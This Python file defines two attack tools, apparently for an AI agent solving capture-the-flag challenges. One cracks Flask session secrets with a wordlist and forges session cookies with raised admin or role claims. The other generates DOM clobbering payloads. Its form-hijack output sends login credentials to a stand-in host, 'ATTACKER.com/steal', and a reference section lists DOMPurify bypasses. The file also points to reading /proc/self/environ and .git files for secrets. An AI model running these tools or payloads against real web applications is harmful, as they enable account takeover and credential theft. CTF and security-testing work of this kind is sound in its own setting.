"""
Flask session cookie forgery and DOM clobbering payload generation tools for CTF solving.

Provides utilities for forging Flask/itsdangerous session cookies and generating
DOM clobbering payloads that overwrite JavaScript variables via HTML injection.
"""

import base64
import hashlib
import hmac
import json
import zlib
from typing import List, Optional


class FlaskSessionForgeryTool:
    """
    FlaskSessionForgeryTool: decode, analyze, and forge Flask session cookies.

    Pure logic tool -- no session required.

    Expected JSON tool_input format:

        {
          "operation": "decode",
          "cookie": "eyJhZG1pbiI6ZmFsc2V9.ZxY..."
        }

    Supported operations:
      - decode: Decode a Flask session cookie and display its contents
      - forge: Forge a new Flask session cookie with modified claims
      - brute_secret: Try common secrets to verify/crack the signing key
      - analyze: Analyze a cookie and suggest attack strategies
    """

    name: str = "flask_session_forge"
    description: str = (
        "Decode, analyze, and forge Flask/itsdangerous session cookies. "
        "Input must be JSON with 'operation' (decode, forge, brute_secret, analyze). "
        "For decode/analyze: provide 'cookie'. For forge: provide 'data' (dict of claims) "
        "and 'secret'. For brute_secret: provide 'cookie' and optionally 'wordlist' "
        "(list of secrets to try). Returns decoded session data or forged cookies."
    )

    VALID_OPERATIONS = ("decode", "forge", "brute_secret", "analyze")

    # Common Flask secret keys found in CTFs
    COMMON_SECRETS: List[str] = [
        "secret",
        "secret_key",
        "secretkey",
        "SECRET_KEY",
        "supersecret",
        "password",
        "password123",
        "admin",
        "flask",
        "flask-secret",
        "flasksecret",
        "change_me",
        "changeme",
        "development",
        "dev",
        "test",
        "testing",
        "key",
        "my_secret",
        "mysecret",
        "app_secret",
        "s3cr3t",
        "s3cret",
        "default",
        "debug",
        "1234",
        "12345",
        "123456",
        "qwerty",
        "asdf",
        "letmein",
        "abc123",
        "monkey",
        "master",
        "dragon",
        "login",
        "princess",
        "football",
        "shadow",
        "sunshine",
        "trustno1",
        "iloveyou",
        "batman",
        "access",
        "hello",
        "charlie",
        "CHANGE_ME",
        "the_secret_key",
        "thesecretkey",
        "my-secret-key",
        "my_secret_key",
        "flask_secret",
        "hackthebox",
        "ctf",
        "flag",
        "HTB",
        "picoCTF",
        "supersecretkey",
        "super_secret_key",
        "ThisIsNotSoSecret",
        "NoTSoS3cR3t",
        "A0Zr98j/3yX R~XHH!jmN]LWX/,?RT",
    ]

    def use(self, tool_input: str) -> str:
        try:
            data = json.loads(tool_input) if tool_input else {}
        except json.JSONDecodeError as exc:
            return f"[FlaskSessionForgeryTool] Error: Invalid JSON input. {exc}"

        operation = (data.get("operation") or "").strip().lower()
        if not operation:
            return (
                "[FlaskSessionForgeryTool] Error: 'operation' is required. "
                f"Valid operations: {', '.join(self.VALID_OPERATIONS)}"
            )
        if operation not in self.VALID_OPERATIONS:
            return (
                f"[FlaskSessionForgeryTool] Error: Unknown operation '{operation}'. "
                f"Valid operations: {', '.join(self.VALID_OPERATIONS)}"
            )

        if operation == "decode":
            return self._decode(data)
        elif operation == "forge":
            return self._forge(data)
        elif operation == "brute_secret":
            return self._brute_secret(data)
        elif operation == "analyze":
            return self._analyze(data)

        return "[FlaskSessionForgeryTool] Error: Unexpected state."

    # ── Helpers ──────────────────────────────────────────────────

    @staticmethod
    def _b64_decode(s: str) -> bytes:
        """Base64 decode with padding fix."""
        s = s.rstrip("=")
        padding = 4 - len(s) % 4
        if padding != 4:
            s += "=" * padding
        return base64.urlsafe_b64decode(s)

    @staticmethod
    def _b64_encode(data: bytes) -> str:
        """Base64 encode and strip padding."""
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")

    def _decode_payload(self, cookie: str) -> Optional[dict]:
        """Decode the payload portion of a Flask session cookie."""
        try:
            parts = cookie.split(".")
            if len(parts) < 2:
                return None
            payload_b64 = parts[0]
            raw = self._b64_decode(payload_b64)
            # Flask may compress the payload
            if raw[0:1] == b".":
                raw = self._b64_decode(payload_b64[1:])
                raw = zlib.decompress(raw)
            elif raw[0:1] == b"{":
                pass  # already JSON
            else:
                # try decompress
                try:
                    raw = zlib.decompress(raw)
                except zlib.error:
                    pass
            return json.loads(raw)
        except Exception:
            return None

    def _sign_payload(self, payload_dict: dict, secret: str) -> str:
        """Sign a payload dict to produce a Flask session cookie."""
        payload_json = json.dumps(payload_dict, separators=(",", ":"))
        payload_bytes = payload_json.encode("utf-8")

        # Check if compression helps
        compressed = zlib.compress(payload_bytes)
        if len(compressed) < len(payload_bytes):
            payload_b64 = "." + self._b64_encode(compressed)
        else:
            payload_b64 = self._b64_encode(payload_bytes)

        # itsdangerous uses a timestamp
        import time

        timestamp = int(time.time())
        timestamp_b64 = self._b64_encode(
            timestamp.to_bytes((timestamp.bit_length() + 7) // 8, byteorder="big")
        )

        # Build the value to sign
        value = f"{payload_b64}.{timestamp_b64}"

        # Derive signing key (itsdangerous default)
        salt = "cookie-session"
        key_derivation = "hmac"
        digest_method = hashlib.sha1

        if key_derivation == "hmac":
            mac = hmac.new(
                secret.encode("utf-8"),
                salt.encode("utf-8"),
                digest_method,
            )
            derived_key = mac.digest()

        # Sign
        sig = hmac.new(derived_key, value.encode("utf-8"), digest_method).digest()
        sig_b64 = self._b64_encode(sig)

        return f"{value}.{sig_b64}"

    def _verify_cookie(self, cookie: str, secret: str) -> bool:
        """Verify a Flask session cookie signature against a secret."""
        try:
            parts = cookie.split(".")
            if len(parts) < 3:
                return False

            # The signature is the last part, payload.timestamp is the rest
            sig_b64 = parts[-1]
            value = ".".join(parts[:-1])

            # Derive signing key
            salt = "cookie-session"
            mac = hmac.new(
                secret.encode("utf-8"),
                salt.encode("utf-8"),
                hashlib.sha1,
            )
            derived_key = mac.digest()

            expected_sig = hmac.new(
                derived_key, value.encode("utf-8"), hashlib.sha1
            ).digest()
            actual_sig = self._b64_decode(sig_b64)

            return hmac.compare_digest(expected_sig, actual_sig)
        except Exception:
            return False

    # ── Operations ───────────────────────────────────────────────

    def _decode(self, data: dict) -> str:
        cookie = (data.get("cookie") or "").strip()
        if not cookie:
            return "[FlaskSessionForgeryTool] Error: 'cookie' is required for decode."

        lines = [
            "[FlaskSessionForgeryTool] Flask Session Cookie Decode",
            "=" * 55,
            "",
            f"Cookie: {cookie[:80]}{'...' if len(cookie) > 80 else ''}",
            "",
        ]

        payload = self._decode_payload(cookie)
        if payload is None:
            lines.append("[!] Failed to decode cookie payload.")
            lines.append("    This may not be a Flask session cookie, or it may use")
            lines.append("    a non-standard format.")
            return "\n".join(lines)

        lines.append("=== Decoded Payload ===")
        lines.append(json.dumps(payload, indent=2))
        lines.append("")

        # Identify interesting fields
        interesting = []
        for key in payload:
            kl = key.lower()
            if any(
                w in kl
                for w in (
                    "admin",
                    "role",
                    "is_admin",
                    "privilege",
                    "user",
                    "uid",
                    "group",
                )
            ):
                interesting.append(f"  {key}: {payload[key]}")

        if interesting:
            lines.append("=== Interesting Fields ===")
            for item in interesting:
                lines.append(item)
            lines.append("")

        parts = cookie.split(".")
        lines.append(f"Cookie parts: {len(parts)}")
        lines.append(f"  Payload: {parts[0][:40]}...")
        if len(parts) >= 2:
            lines.append(f"  Timestamp: {parts[-2] if len(parts) >= 3 else 'N/A'}")
        if len(parts) >= 3:
            lines.append(f"  Signature: {parts[-1][:20]}...")

        return "\n".join(lines)

    def _forge(self, data: dict) -> str:
        payload_data = data.get("data", {})
        secret = data.get("secret", "")

        if not payload_data:
            return (
                "[FlaskSessionForgeryTool] Error: 'data' (dict) is required for forge."
            )
        if not secret:
            return "[FlaskSessionForgeryTool] Error: 'secret' is required for forge."

        lines = [
            "[FlaskSessionForgeryTool] Flask Session Cookie Forge",
            "=" * 55,
            "",
            f"Secret: {secret}",
            f"Payload: {json.dumps(payload_data)}",
            "",
        ]

        try:
            forged = self._sign_payload(payload_data, secret)
            lines.append("=== Forged Cookie ===")
            lines.append(forged)
            lines.append("")
            lines.append("USAGE:")
            lines.append("Set cookie 'session' to the value above.")
            lines.append("Example with curl:")
            lines.append(f'  curl -b "session={forged}" http://target/')
            lines.append("")
            lines.append("Example with cookie_set tool:")
            lines.append(
                f'  {{"url": "http://target/", "name": "session", "value": "{forged}"}}'
            )
        except Exception as e:
            lines.append(f"[!] Error forging cookie: {e}")
            lines.append("")
            lines.append("Alternative: Use flask-unsign CLI tool:")
            lines.append(
                f"  flask-unsign --sign --cookie '{json.dumps(payload_data)}' --secret '{secret}'"
            )

        return "\n".join(lines)

    def _brute_secret(self, data: dict) -> str:
        cookie = (data.get("cookie") or "").strip()
        wordlist = data.get("wordlist", [])

        if not cookie:
            return "[FlaskSessionForgeryTool] Error: 'cookie' is required for brute_secret."

        # Combine custom wordlist with common secrets
        secrets_to_try = list(wordlist) + self.COMMON_SECRETS
        # Deduplicate while preserving order
        seen = set()
        unique_secrets = []
        for s in secrets_to_try:
            if s not in seen:
                seen.add(s)
                unique_secrets.append(s)

        lines = [
            "[FlaskSessionForgeryTool] Flask Session Secret Brute Force",
            "=" * 55,
            "",
            f"Cookie: {cookie[:60]}...",
            f"Secrets to try: {len(unique_secrets)}",
            "",
        ]

        found_secret = None
        for secret in unique_secrets:
            if self._verify_cookie(cookie, secret):
                found_secret = secret
                break

        if found_secret:
            lines.append(f"[+] SECRET FOUND: {found_secret!r}")
            lines.append("")

            # Decode and show payload
            payload = self._decode_payload(cookie)
            if payload:
                lines.append("=== Current Payload ===")
                lines.append(json.dumps(payload, indent=2))
                lines.append("")
                lines.append("NEXT STEPS:")
                lines.append(f"1. Use the forge operation with secret={found_secret!r}")
                lines.append(
                    "2. Modify fields like 'admin', 'role', 'is_admin' to escalate privileges"
                )
                lines.append("3. Set the forged cookie and access protected endpoints")
        else:
            lines.append("[-] No matching secret found in wordlist.")
            lines.append("")
            lines.append("NEXT STEPS:")
            lines.append("1. Try a larger wordlist (provide 'wordlist' parameter)")
            lines.append(
                "2. Look for the secret in source code, config files, or environment"
            )
            lines.append("3. Check .git/config, /proc/self/environ, or debug pages")
            lines.append("4. Use flask-unsign with rockyou.txt:")
            lines.append(
                "   flask-unsign --unsign --cookie '<cookie>' --wordlist rockyou.txt"
            )

        return "\n".join(lines)

    def _analyze(self, data: dict) -> str:
        cookie = (data.get("cookie") or "").strip()
        if not cookie:
            return "[FlaskSessionForgeryTool] Error: 'cookie' is required for analyze."

        lines = [
            "[FlaskSessionForgeryTool] Flask Session Cookie Analysis",
            "=" * 55,
            "",
        ]

        # Decode
        payload = self._decode_payload(cookie)
        parts = cookie.split(".")

        lines.append(f"Cookie length: {len(cookie)} chars")
        lines.append(f"Parts: {len(parts)}")
        lines.append("")

        if payload is None:
            lines.append(
                "[!] Could not decode payload — may not be Flask/itsdangerous."
            )
            lines.append("")
            lines.append("Other session cookie frameworks to consider:")
            lines.append("  - Express.js (connect.sid) — try decoding as base64")
            lines.append("  - Django — uses base64 JSON with HMAC")
            lines.append("  - JWT — three base64 parts separated by dots")
            lines.append("  - PHP serialize — starts with a:N:{ or O:N:")
            return "\n".join(lines)

        lines.append("=== Decoded Payload ===")
        lines.append(json.dumps(payload, indent=2))
        lines.append("")

        # Identify attack vectors
        lines.append("=== Attack Vectors ===")
        vectors = []

        for key, val in payload.items():
            kl = key.lower()
            if kl in ("admin", "is_admin", "isadmin"):
                if val is False or val == 0 or val == "false" or val == "0":
                    vectors.append(
                        f"[!] '{key}' is {val!r} — set to True/1 for admin access"
                    )
            elif kl in ("role", "user_role", "userrole"):
                vectors.append(
                    f"[!] '{key}' is {val!r} — try 'admin', 'administrator', 'root'"
                )
            elif kl in ("user", "username", "user_id", "uid"):
                vectors.append(
                    f"[*] '{key}' is {val!r} — try changing to 'admin' or user ID 1"
                )
            elif kl in ("group", "groups", "permissions"):
                vectors.append(
                    f"[*] '{key}' is {val!r} — try escalating group/permissions"
                )

        if vectors:
            for v in vectors:
                lines.append(v)
        else:
            lines.append("[-] No obvious privilege escalation fields found.")
            lines.append("    Examine all fields manually for potential modifications.")

        lines.append("")
        lines.append("=== Suggested Approach ===")
        lines.append("1. Use brute_secret to find the signing key")
        lines.append("2. If secret found, use forge with modified payload")
        lines.append("3. If not, look for secret in:")
        lines.append("   - Source code (app.secret_key, app.config['SECRET_KEY'])")
        lines.append("   - LFI/SSRF to read config files or environment")
        lines.append("   - Git repository leaks (.git/)")
        lines.append("   - Debug/error pages that leak configuration")

        return "\n".join(lines)


class DomClobberingPayloadGenerator:
    """
    DomClobberingPayloadGenerator: generate DOM clobbering payloads to overwrite
    JavaScript variables via HTML injection.

    Pure logic tool -- no session required.

    Expected JSON tool_input format:

        {
          "operation": "overwrite_var",
          "variable": "config.isAdmin",
          "value": "true"
        }

    Supported operations:
      - overwrite_var: Generate payloads to overwrite a JS variable via named HTML elements
      - form_hijack: Generate payloads to hijack form actions via clobbering
      - reference: Reference of DOM clobbering techniques and browser behavior
    """

    name: str = "dom_clobbering_payload_generator"
    description: str = (
        "Generate DOM clobbering payloads that overwrite JavaScript variables via HTML injection. "
        "Input must be JSON with 'operation' (overwrite_var, form_hijack, reference). "
        "For overwrite_var: provide 'variable' (JS variable path like 'config.isAdmin') and "
        "'value' (desired value). Returns HTML payloads that clobber JS namespace to achieve "
        "XSS or auth bypass without script injection."
    )

    VALID_OPERATIONS = ("overwrite_var", "form_hijack", "reference")

    def use(self, tool_input: str) -> str:
        try:
            data = json.loads(tool_input) if tool_input else {}
        except json.JSONDecodeError as exc:
            return f"[DomClobberingPayloadGenerator] Error: Invalid JSON input. {exc}"

        operation = (data.get("operation") or "").strip().lower()
        if not operation:
            return (
                "[DomClobberingPayloadGenerator] Error: 'operation' is required. "
                f"Valid operations: {', '.join(self.VALID_OPERATIONS)}"
            )
        if operation not in self.VALID_OPERATIONS:
            return (
                f"[DomClobberingPayloadGenerator] Error: Unknown operation '{operation}'. "
                f"Valid operations: {', '.join(self.VALID_OPERATIONS)}"
            )

        if operation == "overwrite_var":
            return self._overwrite_var(data)
        elif operation == "form_hijack":
            return self._form_hijack(data)
        elif operation == "reference":
            return self._reference(data)

        return "[DomClobberingPayloadGenerator] Error: Unexpected state."

    def _overwrite_var(self, data: dict) -> str:
        variable = data.get("variable", "config.isAdmin")
        value = data.get("value", "true")

        parts = variable.split(".")
        lines = [
            "[DomClobberingPayloadGenerator] Variable Overwrite Payloads",
            "=" * 60,
            "",
            f"Target variable: {variable}",
            f"Desired value: {value}",
            "",
        ]

        if len(parts) == 1:
            # Simple global variable: window.X
            name = parts[0]
            lines.append("=== Single-level clobber (window.X) ===")
            lines.append("")
            lines.append(f'<a id="{name}" href="{value}"></a>')
            lines.append(f"  -> window.{name} becomes the <a> element")
            lines.append(f"  -> window.{name}.toString() returns '{value}' (href)")
            lines.append("")
            lines.append(
                f'<form id="{name}"><input name="value" value="{value}"></form>'
            )
            lines.append(f"  -> window.{name}.value.value === '{value}'")
            lines.append("")
            lines.append(f'<img id="{name}" name="{name}">')
            lines.append(f"  -> window.{name} is the <img> element")
            lines.append("")

        elif len(parts) == 2:
            # Two-level: window.X.Y
            parent, child = parts
            lines.append(f"=== Two-level clobber (window.{parent}.{child}) ===")
            lines.append("")
            lines.append("--- Method 1: <a> with id + name ---")
            lines.append(f'<a id="{parent}" name="{child}" href="{value}"></a>')
            lines.append(
                f"  Note: id creates window.{parent}, name is accessible via .{child}"
            )
            lines.append("")
            lines.append("--- Method 2: <form> with named input ---")
            lines.append(
                f'<form id="{parent}"><input name="{child}" value="{value}"></form>'
            )
            lines.append(f"  -> window.{parent}.{child}.value === '{value}'")
            lines.append("")
            lines.append("--- Method 3: <fieldset> with <a> ---")
            lines.append(
                f'<fieldset id="{parent}"><a id="{child}" href="{value}"></a></fieldset>'
            )
            lines.append(f"  -> window.{parent}.{child}.toString() returns '{value}'")
            lines.append("")
            lines.append("--- Method 4: HTMLCollection clobber ---")
            lines.append(
                f'<a id="{parent}"></a><a id="{parent}" name="{child}" href="{value}"></a>'
            )
            lines.append(f"  -> window.{parent} becomes HTMLCollection")
            lines.append(f"  -> window.{parent}.{child} is the second <a>")
            lines.append(f"  -> .toString() returns '{value}'")
            lines.append("")

        elif len(parts) == 3:
            # Three-level: window.X.Y.Z
            p1, p2, p3 = parts
            lines.append(f"=== Three-level clobber (window.{p1}.{p2}.{p3}) ===")
            lines.append("")
            lines.append("--- Method 1: <form> + named elements ---")
            lines.append(
                f'<form id="{p1}" name="{p1}">'
                f'<input id="{p2}" name="{p3}" value="{value}">'
                f"</form>"
            )
            lines.append("")
            lines.append("--- Method 2: Nested fieldset ---")
            lines.append(
                f'<fieldset id="{p1}">'
                f'<fieldset id="{p2}">'
                f'<a id="{p3}" href="{value}"></a>'
                f"</fieldset>"
                f"</fieldset>"
            )
            lines.append("")
            lines.append("--- Method 3: iframe srcdoc (if allowed) ---")
            lines.append(
                f'<iframe name="{p1}" srcdoc="'
                f"<a id={p2} name={p3} href={value}></a>"
                f'"></iframe>'
            )
            lines.append("")

        else:
            lines.append(f"[!] {len(parts)}-level deep clobbering is very difficult.")
            lines.append("    Consider using iframe srcdoc nesting or")
            lines.append("    targeting an intermediate object instead.")
            lines.append("")

        lines.append("=== Notes ===")
        lines.append("- DOM clobbering works when DOMPurify allows id/name attributes")
        lines.append("- The clobbered value is an Element, not a primitive")
        lines.append("- .toString() on <a> returns its href, enabling string coercion")
        lines.append("- .src on <img>/<iframe> can also be used for URL injection")
        lines.append("- Works even with strict CSP (no script execution needed)")

        return "\n".join(lines)

    def _form_hijack(self, data: dict) -> str:
        target_form = data.get("form_id", "loginForm")
        attacker_url = data.get("attacker_url", "https://ATTACKER.com/steal")

        lines = [
            "[DomClobberingPayloadGenerator] Form Action Hijack Payloads",
            "=" * 60,
            "",
            f"Target form: {target_form}",
            f"Attacker URL: {attacker_url}",
            "",
            "=== Technique 1: Clobber form.action ===",
            "",
            f'<form id="{target_form}" action="{attacker_url}">',
            "  <!-- If the page has JS that submits this form, credentials go to attacker -->",
            "</form>",
            "",
            "=== Technique 2: base tag hijack ===",
            "",
            f'<base href="{attacker_url}">',
            "  <!-- All relative URLs on the page now resolve against attacker URL -->",
            "  <!-- Forms with relative action= will submit to attacker -->",
            "",
            "=== Technique 3: Clobber document.forms ===",
            "",
            f'<form name="{target_form}" action="{attacker_url}">',
            f"  <!-- Accessible as document.forms.{target_form} -->",
            "  <!-- May shadow the legitimate form -->",
            "</form>",
            "",
            "=== Technique 4: button formaction override ===",
            "",
            f'<button form="{target_form}" formaction="{attacker_url}" type="submit">Login</button>',
            "  <!-- Overrides the form's action when this button is clicked -->",
            "",
            "=== Notes ===",
            "- DOMPurify (default config) allows <form>, <base>, <button>",
            "- <base> hijack is powerful — affects all relative URLs on the page",
            "- formaction attribute on <button>/<input> overrides form action",
            "- These work without JavaScript execution (CSP safe)",
        ]

        return "\n".join(lines)

    def _reference(self, data: dict) -> str:
        lines = [
            "[DomClobberingPayloadGenerator] DOM Clobbering Reference",
            "=" * 60,
            "",
            "=== What is DOM Clobbering? ===",
            "",
            "DOM clobbering overwrites JavaScript global variables using named",
            "HTML elements. When an element has an id='X', it becomes accessible",
            "as window.X. This can overwrite undefined variables that JS code",
            "later reads, achieving XSS or auth bypass without script injection.",
            "",
            "=== Named Access: Which Elements? ===",
            "",
            "Elements with id= that clobber window:",
            "  - All elements: id='X' creates window.X",
            "",
            "Elements with name= that clobber window:",
            "  - <embed>, <form>, <iframe>, <img>, <object> (with name=)",
            "  - <a>, <area> (name= works on HTMLCollection lookups)",
            "",
            "=== Clobbering Depth ===",
            "",
            "1 level:  <a id='x' href='value'>",
            "          -> window.x = <a>, window.x.toString() = 'value'",
            "",
            "2 levels: <a id='x'></a><a id='x' name='y' href='value'></a>",
            "          -> window.x = HTMLCollection, window.x.y = <a>",
            "",
            "3 levels: <form id='x'><input id='y' name='z' value='v'></form>",
            "          -> window.x.y.z = 'v' (via .value)",
            "",
            "=== String Coercion Tricks ===",
            "",
            "<a>.toString()         -> returns href (full URL)",
            "<area>.toString()      -> returns href (full URL)",
            "<input>.value          -> returns value attribute",
            "<form>.action          -> returns action URL",
            "Element + ''           -> calls toString() in string context",
            "",
            "=== Common Targets ===",
            "",
            "1. undefined config objects:",
            "   if (typeof config === 'undefined') { config = defaults; }",
            "   -> Clobber 'config' before this check",
            "",
            "2. Script src from variable:",
            "   var url = window.cdnUrl || 'default.js';",
            "   -> Clobber 'cdnUrl' to point to attacker script",
            "",
            "3. Feature flags:",
            "   if (window.DEBUG) { ... }",
            "   -> Clobber 'DEBUG' to enable debug features",
            "",
            "4. JSONP callbacks:",
            "   var callback = window.jsonpCallback;",
            "   -> Clobber to control callback function name",
            "",
            "=== Sanitizer Compatibility ===",
            "",
            "DOMPurify default config ALLOWS:",
            "  id, name, class, href, src, action, value, type",
            "  <a>, <form>, <input>, <img>, <iframe>, <fieldset>",
            "",
            "DOMPurify with SANITIZE_DOM=true BLOCKS:",
            "  id and name attributes that match DOM properties",
            "  -> Bypasses may still exist with non-obvious names",
            "",
            "=== DOMPurify Bypass Techniques ===",
            "",
            "1. Use name= on <img> (not blocked by SANITIZE_DOM):",
            '   <img name="x" src="x">',
            "",
            "2. Use HTMLCollection via duplicate id=:",
            '   <a id="x"></a><a id="x" name="y">',
            "",
            "3. Exploit srcdoc on iframe (if allowed):",
            '   <iframe name="x" srcdoc="<a id=y>">',
        ]

        return "\n".join(lines)
